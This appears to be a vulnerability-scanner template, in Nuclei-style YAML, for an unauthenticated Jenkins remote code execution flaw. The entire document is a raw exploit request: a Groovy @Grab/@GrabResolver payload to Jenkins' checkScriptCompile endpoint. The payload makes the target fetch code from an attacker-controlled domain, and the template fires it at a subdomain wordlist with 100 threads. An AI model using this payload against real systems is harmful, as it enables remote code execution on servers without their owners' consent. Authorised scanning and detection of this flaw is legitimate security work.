id: Jenkins-RCE

info:
  name: Jenkins RCE
  author: 0xAwali
  severity: critical
  description: Jenkins RCE, Commonly Bound Ports 80 - 443 - 8080 - 8888
  reference:
      - https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#jenkins
      - https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html
            
requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://{{Host}}.{{Port}}.{{Subdomains}}.jenkins.{{MY-DOMAIN}}/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange; HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive